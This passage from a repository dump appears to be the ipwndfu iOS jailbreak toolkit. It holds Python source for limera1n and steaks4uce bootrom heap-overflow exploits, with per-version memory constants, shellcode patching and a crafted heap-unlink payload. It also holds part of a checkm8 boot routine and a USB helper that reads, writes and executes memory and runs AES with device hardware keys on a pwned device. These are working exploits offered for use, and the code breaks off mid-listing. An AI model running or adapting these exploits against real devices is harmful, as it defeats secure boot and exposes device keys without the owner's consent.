HEAP_STATE, 2, 132, 128, 0)\n                block2 = struct.pack('<8Q', 0, 0, 0, HEAP_STATE, 2,   8, 128, 0)\n                device = usbexec.PwnedUSBDevice()\n                device.write_memory(HEAP_BASE + HEAP_WRITE_OFFSET        , block1)\n                device.write_memory(HEAP_BASE + HEAP_WRITE_OFFSET +  0x80, block2)\n                device.write_memory(HEAP_BASE + HEAP_WRITE_OFFSET + 0x100, block2)\n                device.write_memory(HEAP_BASE + HEAP_WRITE_OFFSET + 0x180, block2)\n                device.execute(0, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET        )\n                device.execute(0, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET +  0x80)\n                device.execute(0, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET + 0x100)\n                device.execute(0, HEAP_WRITE_HASH, HEAP_BASE + HEAP_WRITE_OFFSET + 0x180)\n                device.execute(0, HEAP_CHECK_ALL)\n                print 'Heap repaired.'\n\n                device.write_memory(TRAMPOLINE, checkm8.asm_arm64_branch(TRAMPOLINE, TRAMPOLINE + 0x400))\n                device.write_memory(TRAMPOLINE + 0x400, open('bin/t8015_shellcode_arm64.bin').read())\n\n                device.write_memory_ptr(BOOTSTRAP_TASK_LR, NAND_BOOT_JUMP)\n                device.write_memory(DFU_BOOL, '\\x01')\n                device.execute(0, DFU_NOTIFY, DFU_STATE)\n                print 'Booted.'\n"
        },
        {
          "name": "ipwnrecovery",
          "type": "blob",
          "size": 2.642578125,
          "content": "#!/usr/bin/python\n# ipwnrecovery: open-source jailbreaking tool for older iOS devices\n# Author: axi0mX\n\nimport getopt, sys\nimport usb # pyusb: use 'pip install pyusb' to install this module\nimport recovery\n\ndef print_help():\n    print 'USAGE: ipwnrecovery [options]'\n    print 'Interact with an iOS device in Recovery Mode.\\n'\n    print 'Basic options:'\n    print '  -c cmd\\t\\t\\trun command on device'\n    print '  -f file\\t\\t\\tsend file to device in Recovery Mode'\n    print 'Advanced options:'\n    print '  --enable-uart\\t\\t\\tset debug-uarts to 3 and reboot device'\n    print '  --exit-recovery-loop\\t\\tenable auto-boot and reboot device'\n\nif __name__ == '__main__':\n    try:\n        advanced = ['exit-recovery-loop', 'enable-uart']\n        opts, args = getopt.getopt(sys.argv[1:], 'c:f:', advanced)\n    except getopt.GetoptError:\n        print 'ERROR: Invalid arguments provided.'\n        print_help()\n        sys.exit(2)\n\n    if len(opts) == 0:\n        print_help()\n        sys.exit(2)\n\n    for opt, arg in opts:\n        if opt == '-c':\n            device = recovery.acquire_device()\n            try:\n                recovery.send_command(device, arg)\n            except usb.core.USBError:\n                print 'WARNING: Caught USBError after running command.'\n            recovery.release_device(device)\n\n        if opt == '-f':\n            try:\n                with open(arg, 'rb') as f:\n                    data = f.read()\n            except IOError:\n                print 'ERROR: Could not read file:', arg\n                sys.exit(1)\n\n            device = recovery.acquire_device()\n            recovery.send_data(device, data)\n            recovery.release_device(device)\n\n        if opt == '--exit-recovery-loop':\n            device = recovery.acquire_device()\n\n            # TODO: getenv auto-boot first and fail if it is already true.\n            recovery.send_command(device, 'setenv auto-boot true')\n            recovery.send_command(device, 'saveenv')\n            try:\n                recovery.send_command(device, 'reboot')\n            except usb.core.USBError:\n                # OK: this is expected when rebooting\n                pass\n\n            recovery.release_device(device)\n\n        if opt == '--enable-uart':\n            device = recovery.acquire_device()\n\n            # TODO: getenv debug-uarts first and fail if it is already 3.\n            recovery.send_command(device, 'setenv debug-uarts 3')\n            recovery.send_command(device, 'saveenv')\n            try:\n                recovery.send_command(device, 'reboot')\n            except usb.core.USBError:\n                # OK: this is expected when rebooting\n                pass\n\n            recovery.release_device(device)\n"
        },
        {
          "name": "libusbfinder",
          "type": "tree",
          "content": null
        },
        {
          "name": "limera1n.py",
          "type": "blob",
          "size": 8.3896484375,
          "content": "# Credit: This file is based on limera1n exploit (heap overflow) by geohot.\n\nimport array, ctypes, struct, sys, time\nimport usb # pyusb: use 'pip install pyusb' to install this module\nimport dfu\n\n# Must be global so garbage collector never frees it \nrequest = None\ntransfer_ptr = None\n\nconstants_359_3 = [\n    0x84031800, #  1 - RELOCATE_SHELLCODE_ADDRESS\n          1024, #  2 - RELOCATE_SHELLCODE_SIZE\n        0x83d4, #  3 - memmove\n    0x84034000, #  4 - MAIN_STACK_ADDRESS\n        0x43c9, #  5 - nor_power_on\n        0x5ded, #  6 - nor_init\n    0x84024820, #  7 - gUSBSerialNumber\n        0x8e7d, #  8 - strlcat\n        0x349d, #  9 - usb_wait_for_image\n    0x84000000, # 10 - LOAD_ADDRESS\n       0x24000, # 11 - MAX_SIZE\n    0x84024228, # 12 - gLeakingDFUBuffer\n        0x1ccd, # 13 - free\n    0x65786563, # 14 - EXEC_MAGIC\n        0x1f79, # 15 - memz_create\n        0x3969, # 16 - jump_to\n        0x1fa1, # 17 - memz_destroy\n          0x60, # 18 - IMAGE3_LOAD_SP_OFFSET\n          0x50, # 19 - IMAGE3_LOAD_STRUCT_OFFSET\n        0x1fe5, # 20 - image3_create_struct\n        0x2655, # 21 - image3_load_continue\n        0x277b, # 22 - image3_load_fail\n]\n\nconstants_359_3_2 = [\n    0x84031800, #  1 - RELOCATE_SHELLCODE_ADDRESS\n          1024, #  2 - RELOCATE_SHELLCODE_SIZE\n        0x83dc, #  3 - memmove\n    0x84034000, #  4 - MAIN_STACK_ADDRESS\n        0x43d1, #  5 - nor_power_on\n        0x5df5, #  6 - nor_init\n    0x84024820, #  7 - gUSBSerialNumber\n        0x8e85, #  8 - strlcat\n        0x34a5, #  9 - usb_wait_for_image\n    0x84000000, # 10 - LOAD_ADDRESS\n       0x24000, # 11 - MAX_SIZE\n    0x84024228, # 12 - gLeakingDFUBuffer\n        0x1ccd, # 13 - free\n    0x65786563, # 14 - EXEC_MAGIC\n        0x1f81, # 15 - memz_create\n        0x3971, # 16 - jump_to\n        0x1fa9, # 17 - memz_destroy\n          0x60, # 18 - IMAGE3_LOAD_SP_OFFSET\n          0x50, # 19 - IMAGE3_LOAD_STRUCT_OFFSET\n        0x1fed, # 20 - image3_create_struct\n        0x265d, # 21 - image3_load_continue\n        0x2783, # 22 - image3_load_fail\n]\n\nconstants_359_5 = [\n    0x84031800, #  1 - RELOCATE_SHELLCODE_ADDRESS\n          1024, #  2 - RELOCATE_SHELLCODE_SIZE\n        0x8564, #  3 - memmove\n    0x84034000, #  4 - MAIN_STACK_ADDRESS\n        0x43b9, #  5 - nor_power_on\n        0x5f75, #  6 - nor_init\n    0x84024750, #  7 - gUSBSerialNumber\n        0x901d, #  8 - strlcat\n        0x36e5, #  9 - usb_wait_for_image\n    0x84000000, # 10 - LOAD_ADDRESS\n       0x24000, # 11 - MAX_SIZE\n    0x84024158, # 12 - gLeakingDFUBuffer\n        0x1a51, # 13 - free\n    0x65786563, # 14 - EXEC_MAGIC\n        0x1f25, # 15 - memz_create\n        0x39dd, # 16 - jump_to\n        0x1f0d, # 17 - memz_destroy\n          0x64, # 18 - IMAGE3_LOAD_SP_OFFSET\n          0x60, # 19 - IMAGE3_LOAD_STRUCT_OFFSET\n        0x2113, # 20 - image3_create_struct\n        0x2665, # 21 - image3_load_continue\n        0x276d, # 22 - image3_load_fail\n]\n\nconstants_574_4 = [\n    0x84039800, #  1 - RELOCATE_SHELLCODE_ADDRESS\n          1024, #  2 - RELOCATE_SHELLCODE_SIZE\n        0x84dc, #  3 - memmove\n    0x8403c000, #  4 - MAIN_STACK_ADDRESS\n        0x4e8d, #  5 - nor_power_on\n        0x690d, #  6 - nor_init\n    0x8402e0e0, #  7 - gUSBSerialNumber\n        0x90c9, #  8 - strlcat\n        0x4c85, #  9 - usb_wait_for_image\n    0x84000000, # 10 - LOAD_ADDRESS\n       0x2c000, # 11 - MAX_SIZE\n    0x8402dbcc, # 12 - gLeakingDFUBuffer\n        0x3b95, # 13 - free\n    0x65786563, # 14 - EXEC_MAGIC\n        0x7469, # 15 - memz_create\n        0x5a5d, # 16 - jump_to\n        0x7451, # 17 - memz_destroy\n          0x68, # 18 - IMAGE3_LOAD_SP_OFFSET\n          0x64, # 19 - IMAGE3_LOAD_STRUCT_OFFSET\n        0x412d, # 20 - image3_create_struct\n        0x46db, # 21 - image3_load_continue\n        0x47db, # 22 - image3_load_fail\n]\n\nclass DeviceConfig:\n    def __init__(self, version, cpid, exploit_lr, max_size, constants):\n        self.version = version\n        self.cpid = cpid\n        self.exploit_lr = exploit_lr\n        self.max_size = max_size\n        self.constants = constants\n\nconfigs = [\n    DeviceConfig('359.3',   '8920', 0x84033FA4, 0x24000, constants_359_3),   # S5L8920 (old bootrom)\n    DeviceConfig('359.3.2', '8920', 0x84033FA4, 0x24000, constants_359_3_2), # S5L8920 (new bootrom)\n    DeviceConfig('359.5',   '8922', 0x84033F98, 0x24000, constants_359_5),   # S5L8922\n    DeviceConfig('574.4',   '8930', 0x8403BF9C, 0x2C000, constants_574_4),   # S5L8930\n]\n\ndef create_control_transfer(device, request, timeout):\n    ptr = usb.backend.libusb1._lib.libusb_alloc_transfer(0)\n    assert ptr is not None\n\n    transfer = ptr.contents\n    transfer.dev_handle = device._ctx.handle.handle\n    transfer.endpoint = 0 # EP0\n    transfer.type = 0 # LIBUSB_TRANSFER_TYPE_CONTROL\n    transfer.timeout = timeout\n    transfer.buffer = request.buffer_info()[0] # C-pointer to request buffer\n    transfer.length = len(request)\n    transfer.user_data = None\n    transfer.callback = usb.backend.libusb1._libusb_transfer_cb_fn_p(0) # NULL\n    transfer.flags = 1 << 1 # LIBUSB_TRANSFER_FREE_BUFFER\n\n    return ptr\n\ndef limera1n_libusb1_async_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex, data, timeout):\n    if usb.backend.libusb1._lib is not device._ctx.backend.lib:\n        print 'ERROR: This exploit requires libusb1 backend, but another backend is being used. Exiting.'\n        sys.exit(1)\n\n    request = array.array('B', struct.pack('<BBHHH', bmRequestType, bRequest, wValue, wIndex, len(data)) + data)\n    transfer_ptr = create_control_transfer(device, request, timeout)\n    assert usb.backend.libusb1._lib.libusb_submit_transfer(transfer_ptr) == 0\n\n    time.sleep(timeout / 1000.0)\n\n    # Prototype of libusb_cancel_transfer is missing from pyusb\n    usb.backend.libusb1._lib.libusb_cancel_transfer.argtypes = [ctypes.POINTER(usb.backend.libusb1._libusb_transfer)]\n    assert usb.backend.libusb1._lib.libusb_cancel_transfer(transfer_ptr) == 0\n\ndef generate_payload(constants, exploit_lr):\n    with open('bin/limera1n-shellcode.bin', 'rb') as f:\n        shellcode = f.read()\n\n    # Shellcode has placeholder values for constants; check they match and replace with constants from config\n    placeholders_offset = len(shellcode) - 4 * len(constants)\n    for i in range(len(constants)):\n        offset = placeholders_offset + 4 * i\n        (value,) = struct.unpack('<I', shellcode[offset:offset + 4])\n        assert value == 0xBAD00001 + i\n\n    shellcode_address = 0x84000400 + 1\n    heap_block = struct.pack('<4I48s', 0x405, 0x101, shellcode_address, exploit_lr, '\\xCC' * 48)\n    return heap_block * 16 + shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants)\n\ndef exploit():\n    print '*** based on limera1n exploit (heap overflow) by geohot ***'\n\n    device = dfu.acquire_device()\n    print 'Found:', device.serial_number\n\n    if 'PWND:[' in device.serial_number:\n        print 'Device is already in pwned DFU Mode. Not executing exploit.'\n        return\n    \n    chosenConfig = None\n    for config in configs:\n        if 'SRTG:[iBoot-%s]' % config.version in device.serial_number:\n            chosenConfig = config\n            break\n    if chosenConfig is None:\n        for config in configs:\n            if 'CPID:%s' % config.cpid in device.serial_number:\n                print 'ERROR: CPID is compatible, but serial number string does not match.'\n                print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'\n                sys.exit(1)\n        print 'ERROR: Not a compatible device. This exploit is for S5L8920/S5L8922/S5L8930 devices only. Exiting.'\n        sys.exit(1)\n    \n    dfu.send_data(device, generate_payload(chosenConfig.constants, chosenConfig.exploit_lr))\n\n    assert len(device.ctrl_transfer(0xA1, 1, 0, 0, 1, 1000)) == 1\n\n    limera1n_libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 10)\n\n    try:\n        device.ctrl_transfer(0x21, 2, 0, 0, 0, 10)\n        print 'ERROR: This request succeeded, but it should have raised an exception. Exiting.'\n        sys.exit(1)\n    except usb.core.USBError:\n        # OK: This request should have raised USBError.\n        pass\n\n    dfu.usb_reset(device)\n    dfu.release_device(device)\n    \n    device = dfu.acquire_device()\n    dfu.request_image_validation(device)\n    dfu.release_device(device)\n\n    time.sleep(0.5)\n\n    device = dfu.acquire_device()\n    failed = 'PWND:[limera1n]' not in device.serial_number\n    dfu.release_device(device)\n\n    if failed:\n        print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.'\n        sys.exit(1)\n\n    print 'Device is now in pwned DFU Mode.'\n"
        },
        {
          "name": "nor-backups",
          "type": "tree",
          "content": null
        },
        {
          "name": "nor.py",
          "type": "blob",
          "size": 1.3916015625,
          "content": "import binascii, struct\n\nNOR_SIZE = 0x100000\n\nclass NorData():\n    def __init__(self, dump):\n        assert len(dump) == NOR_SIZE\n\n        (img2_magic, self.block_size, unused, firmware_block, firmware_block_count) = struct.unpack('<4s4I', dump[:20])\n        (img2_crc,) = struct.unpack('<I', dump[48:52])\n        assert img2_crc == binascii.crc32(dump[:48]) & 0xffffffff\n\n        self.firmware_offset = self.block_size * firmware_block\n        self.firmware_length = self.block_size * firmware_block_count\n        self.parts = [\n          dump[0:52],\n          dump[52:512],\n          dump[512:self.firmware_offset],\n          dump[self.firmware_offset:self.firmware_offset + self.firmware_length],\n          dump[self.firmware_offset + self.firmware_length:]\n        ]\n\n        self.images = []\n        offset = 0\n        while 1:\n            (magic, size) = struct.unpack('<4sI', self.parts[3][offset:offset+8])\n            if magic != 'Img3'[::-1] or size == 0:\n                break\n            self.images.append(self.parts[3][offset:offset + size])\n            offset += size\n\n    def dump(self):\n        # Replace self.parts[3] with content of self.images\n        all_images = ''.join(self.images)\n        all_images += '\\xff' * (self.firmware_length - len(all_images))\n        dump = self.parts[0] + self.parts[1] + self.parts[2] + all_images + self.parts[4]\n        assert len(dump) == NOR_SIZE\n        return dump\n"
        },
        {
          "name": "recovery.py",
          "type": "blob",
          "size": 1.2939453125,
          "content": "import sys, time\nimport usb # pyusb: use 'pip install pyusb' to install this module\nimport usb.backend.libusb1\nimport libusbfinder\n\nMAX_PACKET_SIZE = 0x4000\n\ndef acquire_device(timeout=10):\n    backend = usb.backend.libusb1.get_backend(find_library=lambda x:libusbfinder.libusb1_path())\n    #print 'Acquiring device handle',\n    start = time.time()\n    # Keep retrying for up to timeout seconds if device is not found.\n    while time.time() - start < timeout:\n        device = usb.core.find(idVendor=0x5AC, idProduct=0x1281, backend=backend)\n        if device is not None:\n            return device\n        sys.stdout.flush()\n        time.sleep(0.1)\n    print 'ERROR: No Apple device in Recovery Mode 0x1281 detected. Exiting.'\n    sys.exit(1)\n\ndef release_device(device):\n    #print 'Releasing device handle.'\n    usb.util.dispose_resources(device)\n\ndef send_command(device, command):\n    # TODO: Add assert?\n    device.ctrl_transfer(0x40, 0, 0, 0, command + '\\x00', 30000)\n\ndef send_data(device, data):\n    #print 'Sending 0x%x of data to device.' % len(data)\n    assert device.ctrl_transfer(0x41, 0, 0, 0, 0, 1000) == 0\n    index = 0\n    while index < len(data):\n        amount = min(len(data) - index, MAX_PACKET_SIZE)\n        assert device.write(0x04, data[index:index + amount], 1000) == amount\n        index += amount\n"
        },
        {
          "name": "repo",
          "type": "tree",
          "content": null
        },
        {
          "name": "src",
          "type": "tree",
          "content": null
        },
        {
          "name": "steaks4uce.py",
          "type": "blob",
          "size": 5.404296875,
          "content": "# Credit: This file is based on steaks4uce exploit (heap overflow) by pod2g.\n\nimport struct, sys, time\nimport usb # pyusb: use 'pip install pyusb' to install this module\nimport dfu\n\nconstants_240_4 = [\n    0x22030000, #  1 - MAIN_STACK_ADDRESS\n        0x3af5, #  2 - nor_power_on\n        0x486d, #  3 - nor_init\n        0x6c81, #  4 - usb_destroy\n        0x1059, #  5 - usb_shutdown\n         0x560, #  6 - invalidate_instruction_cache\n    0x2202d800, #  7 - RELOCATE_SHELLCODE_ADDRESS\n         0x200, #  8 - RELOCATE_SHELLCODE_SIZE\n        0x795c, #  9 - memmove\n         0x534, # 10 - clean_data_cache\n         0x280, # 11 - gVersionString\n        0x83cd, # 12 - strlcat\n        0x30e9, # 13 - usb_wait_for_image\n    0x22000000, # 14 - LOAD_ADDRESS\n       0x24000, # 15 - MAX_SIZE\n    0x220241ac, # 16 - gLeakingDFUBuffer\n        0x1955, # 17 - free\n    0x65786563, # 18 - EXEC_MAGIC\n        0x1bf1, # 19 - memz_create\n        0x3339, # 20 - jump_to\n        0x1c19, # 21 - memz_destroy\n          0x58, # 22 - IMAGE3_LOAD_SP_OFFSET\n          0x54, # 23 - IMAGE3_LOAD_STRUCT_OFFSET\n        0x1c5d, # 24 - image3_create_struct\n        0x22cd, # 25 - image3_load_continue\n        0x23a3, # 26 - image3_load_fail\n]\n\nconstants_240_5_1 = [\n    0x22030000, #  1 - MAIN_STACK_ADDRESS\n        0x3afd, #  2 - nor_power_on\n        0x4875, #  3 - nor_init\n        0x6c89, #  4 - usb_destroy\n        0x1059, #  5 - usb_shutdown\n         0x560, #  6 - invalidate_instruction_cache\n    0x2202d800, #  7 - RELOCATE_SHELLCODE_ADDRESS\n         0x200, #  8 - RELOCATE_SHELLCODE_SIZE\n        0x7964, #  9 - memmove\n         0x534, # 10 - clean_data_cache\n         0x280, # 11 - gVersionString\n        0x83d5, # 12 - strlcat\n        0x30f1, # 13 - usb_wait_for_image\n    0x22000000, # 14 - LOAD_ADDRESS\n       0x24000, # 15 - MAX_SIZE\n    0x220241ac, # 16 - gLeakingDFUBuffer\n        0x1955, # 17 - free\n    0x65786563, # 18 - EXEC_MAGIC\n        0x1bf9, # 19 - memz_create\n        0x3341, # 20 - jump_to\n        0x1c21, # 21 - memz_destroy\n          0x58, # 22 - IMAGE3_LOAD_SP_OFFSET\n          0x54, # 23 - IMAGE3_LOAD_STRUCT_OFFSET\n        0x1c65, # 24 - image3_create_struct\n        0x22d5, # 25 - image3_load_continue\n        0x23ab, # 26 - image3_load_fail\n]\n\nclass DeviceConfig:\n  def __init__(self, version, constants):\n    self.version = version\n    self.constants = constants\n\nconfigs = [\n  DeviceConfig('240.4',   constants_240_4),   # S5L8720 (old bootrom)\n  DeviceConfig('240.5.1', constants_240_5_1), # S5L8720 (new bootrom)\n]\n\n# Pad to length 256 and add heap data for overwrite\npayload = '\\x00' * 256 + struct.pack('<14I',\n              # 1. Allocated chunk to be freed\n              # Chunk header: (size 0x8)\n        0x84, #   0x00: previous_chunk\n         0x5, #   0x04: next_chunk\n              # Contents: (requested size 0x1c, allocated size 0x20)\n        0x80, #   0x08: buffer[0] - direction\n  0x22026280, #   0x0c: buffer[1] - usb_response_buffer\n  0xffffffff, #   0x10: buffer[2]\n       0x138, #   0x14: buffer[3] - size of payload in bytes\n       0x100, #   0x18: buffer[4]\n         0x0, #   0x1c: buffer[5]\n         0x0, #   0x20: buffer[6]\n         0x0, #   0x24: unused\n              # 2. Fake free chunk\n              # Chunk header: (size 0x8)\n        0x15, #   0x28: previous_chunk\n         0x2, #   0x2c: next_chunk\n              # Attack fd/bk pointers in this free chunk for arbitrary write:\n  0x22000001, #   0x30: fd - shellcode_address (what to write)\n  0x2202d7fc, #   0x34: bk - exception_irq() LR on the stack (where to write it)\n)\n\ndef generate_shellcode(constants):\n  with open('bin/steaks4uce-shellcode.bin', 'rb') as f:\n    shellcode = f.read()\n\n  # Shellcode has placeholder values for constants; check they match and replace with constants from config\n  placeholders_offset = len(shellcode) - 4 * len(constants)\n  for i in range(len(constants)):\n    offset = placeholders_offset + 4 * i\n    (value,) = struct.unpack('<I', shellcode[offset:offset + 4])\n    assert value == 0xBAD00001 + i\n\n  return shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants)\n\ndef exploit():\n  print '*** based on steaks4uce exploit (heap overflow) by pod2g ***'\n\n  device = dfu.acquire_device()\n  print 'Found:', device.serial_number\n\n  if 'PWND:[' in device.serial_number:\n    print 'Device is already in pwned DFU Mode. Not executing exploit.'\n    return\n\n  if 'CPID:8720' not in device.serial_number:\n    print 'ERROR: Not a compatible device. This exploit is for S5L8720 devices only. Exiting.'\n    sys.exit(1)\n\n  chosenConfig = None\n  for config in configs:\n    if 'SRTG:[iBoot-%s]' % config.version in device.serial_number:\n      chosenConfig = config\n      break\n\n  if chosenConfig is None:\n    print 'ERROR: CPID is compatible, but serial number string does not match.'\n    print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'\n    sys.exit(1)\n\n  dfu.reset_counters(device)\n  dfu.send_data(device, generate_shellcode(chosenConfig.constants))\n  dfu.send_data(device, payload)\n  assert len(device.ctrl_transfer(0xA1, 1, 0, 0, len(payload), 1000)) == len(payload)\n  dfu.release_device(device)\n\n  time.sleep(0.01)\n\n  device = dfu.acquire_device()\n  dfu.usb_reset(device)\n  dfu.release_device(device)\n\n  device = dfu.acquire_device()\n  failed = 'PWND:[steaks4uce]' not in device.serial_number\n  dfu.release_device(device)\n\n  if failed:\n    print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.'\n    sys.exit(1)\n\n  print 'Device is now in pwned DFU Mode.'\n"
        },
        {
          "name": "usb",
          "type": "tree",
          "content": null
        },
        {
          "name": "usbexec.py",
          "type": "blob",
          "size": 7.4716796875,
          "content": "import struct, sys\nimport dfu, device_platform\n\nclass ExecConfig:\n  def __init__(self, info, aes_crypto_cmd):\n    self.info           = info\n    self.aes_crypto_cmd = aes_crypto_cmd\n\n  def match(self, info):\n    return info == self.info[0].ljust(0x40, '\\0') + self.info[1].ljust(0x40, '\\0') + self.info[2].ljust(0x80, '\\0')\n\nconfigs = [\n  ExecConfig(('SecureROM for s5l8947xsi, Copyright 2011, Apple Inc.',   'RELEASE',     'iBoot-1458.2'),          aes_crypto_cmd=0x7060+1),\n  ExecConfig(('SecureROM for s5l8950xsi, Copyright 2011, Apple Inc.',   'RELEASE',     'iBoot-1145.3'),          aes_crypto_cmd=0x7300+1),\n  ExecConfig(('SecureROM for s5l8955xsi, Copyright 2011, Apple Inc.',   'RELEASE',     'iBoot-1145.3.3'),        aes_crypto_cmd=0x7340+1),\n  ExecConfig(('SecureROM for t8002si, Copyright 2007-2014, Apple Inc.', 'ROMRELEASE',  'iBoot-2651.0.0.1.31'),   aes_crypto_cmd=0x86DC+1),\n  ExecConfig(('SecureROM for t8004si, Copyright 2007-2014, Apple Inc.', 'ROMRELEASE',  'iBoot-2651.0.0.3.3'),    aes_crypto_cmd=0x786C+1),\n  ExecConfig(('SecureROM for s5l8960xsi, Copyright 2012, Apple Inc.',   'RELEASE',     'iBoot-1704.10'),         aes_crypto_cmd=0x10000B9A8),\n  ExecConfig(('SecureROM for t8010si, Copyright 2007-2015, Apple Inc.', 'ROMRELEASE',  'iBoot-2696.0.0.1.33'),   aes_crypto_cmd=0x10000C8F4),\n  ExecConfig(('SecureROM for t8011si, Copyright 2007-2015, Apple Inc.', 'ROMRELEASE',  'iBoot-3135.0.0.2.3'),    aes_crypto_cmd=0x10000C994),\n  ExecConfig(('SecureROM for t8015si, Copyright 2007-2016, Apple Inc.', 'ROMRELEASE',  'iBoot-3332.0.0.1.23'),   aes_crypto_cmd=0x100009E9C),\n]\n\nEXEC_MAGIC = 'execexec'[::-1]\nDONE_MAGIC = 'donedone'[::-1]\nMEMC_MAGIC = 'memcmemc'[::-1]\nMEMS_MAGIC = 'memsmems'[::-1]\nUSB_READ_LIMIT  = 0x8000\nCMD_TIMEOUT     = 5000\nAES_BLOCK_SIZE  = 16\nAES_ENCRYPT     = 16\nAES_DECRYPT     = 17\nAES_GID_KEY     = 0x20000200\nAES_UID_KEY     = 0x20000201\n\nclass PwnedUSBDevice():\n  def memset(self, address, c, length):          self.command(self.cmd_memset(address, c, length), 0)\n  def memcpy(self, dest, src, length):           self.command(self.cmd_memcpy(dest, src, length), 0)\n  def read_memory_ptr(self, address):            return struct.unpack('<%s' % self.cmd_arg_type(), self.read_memory(address, self.cmd_arg_size()))[0]\n  def read_memory_uint8(self, address):          return struct.unpack('<B', self.read_memory(address, 1))[0]\n  def read_memory_uint16(self, address):         return struct.unpack('<H', self.read_memory(address, 2))[0]\n  def read_memory_uint32(self, address):         return struct.unpack('<I', self.read_memory(address, 4))[0]\n  def read_memory_uint64(self, address):         return struct.unpack('<Q', self.read_memory(address, 8))[0]\n  def write_memory(self, address, data):         self.command(self.cmd_memcpy(address, self.cmd_data_address(3), len(data)) + data, 0)\n  def write_memory_ptr(self, address, value):    self.write_memory(address, struct.pack('<%s' % self.cmd_arg_type(), value))\n  def write_memory_uint8(self, address, value):  self.write_memory(address, struct.pack('<B', value))\n  def write_memory_uint16(self, address, value): self.write_memory(address, struct.pack('<H', value))\n  def write_memory_uint32(self, address, value): self.write_memory(address, struct.pack('<I', value))\n  def write_memory_uint64(self, address, value): self.write_memory(address, struct.pack('<Q', value))\n  def cmd_arg_type(self):                        return 'Q' if self.platform.arch == 'arm64' else 'I'\n  def cmd_arg_size(self):                        return 8 if self.platform.arch == 'arm64' else 4\n  def cmd_data_offset(self, index):              return 16 + index * self.cmd_arg_size()\n  def cmd_data_address(self, index):             return self.load_base() + self.cmd_data_offset(index)\n  def cmd_memcpy(self, dest, src, length):       return struct.pack('<8s8x3%s' % self.cmd_arg_type(), MEMC_MAGIC, dest, src, length)\n  def cmd_memset(self, address, c, length):      return struct.pack('<8s8x3%s' % self.cmd_arg_type(), MEMS_MAGIC, address, c, length)\n\n  def load_base(self):\n    if 'SRTG:' in self.serial_number:\n      return self.platform.dfu_image_base\n    else:\n      return self.platform.dfu_load_base\n\n  def image_base(self):\n    if 'SRTG:' in self.serial_number:\n      return self.platform.rom_base\n    else:\n      return self.platform.dfu_image_base\n\n  def usb_serial_number(self, key):\n    for pair in self.serial_number.split(' '):\n      if pair.startswith(key + ':'):\n        k,v = pair.split(':')\n        if v[0] == '[' and v[-1] == ']':\n          return v[1:-1]\n        else:\n          return int(v, 16)\n    return None\n\n  def aes(self, data, action, key):\n    assert len(data) % AES_BLOCK_SIZE == 0\n    (retval, received) = self.execute(len(data), self.config.aes_crypto_cmd, action, self.cmd_data_address(7), self.cmd_data_address(0), len(data), key, 0, 0, data)\n    assert retval & 0xFFFFFFFF == 0\n    return received[:len(data)]      \n\n  def read_memory(self, address, length):\n    data = str()\n    while len(data) < length:\n      part_length = min(length - len(data), USB_READ_LIMIT - self.cmd_data_offset(0))\n      response = self.command(self.cmd_memcpy(self.cmd_data_address(0), address + len(data), part_length), self.cmd_data_offset(0) + part_length)\n      assert response[:8] == DONE_MAGIC\n      data += response[self.cmd_data_offset(0):]\n    return data\n\n  def command(self, request_data, response_length):\n    assert 0 <= response_length <= USB_READ_LIMIT\n    device = dfu.acquire_device()\n    assert self.serial_number == device.serial_number\n    dfu.send_data(device, '\\0' * 16)\n    device.ctrl_transfer(0x21, 1, 0, 0, 0, 100)\n    device.ctrl_transfer(0xA1, 3, 0, 0, 6, 100)\n    device.ctrl_transfer(0xA1, 3, 0, 0, 6, 100)\n    dfu.send_data(device, request_data)\n\n    # HACK\n    if response_length == 0:\n      response = device.ctrl_transfer(0xA1, 2, 0xFFFF, 0, response_length + 1, CMD_TIMEOUT).tostring()[1:]\n    else:\n      response = device.ctrl_transfer(0xA1, 2, 0xFFFF, 0, response_length, CMD_TIMEOUT).tostring()\n    dfu.release_device(device)\n    assert len(response) == response_length\n    return response\n\n  def execute(self, response_length, *args):\n    cmd = str()\n    for i in range(len(args)):\n      if isinstance(args[i], (int, long)):\n        cmd += struct.pack('<%s' % self.cmd_arg_type(), args[i])\n      elif isinstance(args[i], basestring) and i == len(args) - 1:\n        cmd += args[i]\n      else:\n        print 'ERROR: usbexec.execute: invalid argument at position %s' % i\n        sys.exit(1)\n      if i == 0 and self.platform.arch != 'arm64':\n        cmd += '\\0' * 4\n    response = self.command(EXEC_MAGIC + cmd, self.cmd_data_offset(0) + response_length)\n    done, retval = struct.unpack('<8sQ', response[:self.cmd_data_offset(0)])\n    assert done == DONE_MAGIC\n    return retval, response[self.cmd_data_offset(0):]\n\n  def __init__(self):\n    self.config = None\n    self.platform = None\n\n    device = dfu.acquire_device()\n    self.serial_number = device.serial_number\n    dfu.release_device(device)\n \n    for dp in device_platform.all_platforms:\n      if self.serial_number.startswith('CPID:%04x CPRV:%02x ' % (dp.cpid, dp.cprv)):\n        self.platform = dp\n        break\n    if self.platform is None:\n      print self.serial_number\n      print 'ERROR: No matching usbexec.platform found for this device.'\n      sys.exit(1)\n\n    info = self.read_memory(self.image_base() + 0x200, 0x100)\n    for config in configs:\n      if config.match(info):\n        self.config = config\n        break\n    if self.config is None:\n      print info\n      print 'ERROR: No matching usbexec.config found for this image.'\n      sys.exit(1)\n"
        },
        {
          "name": "utilities.py",
          "type": "blob",
          "size": 1.08203125,
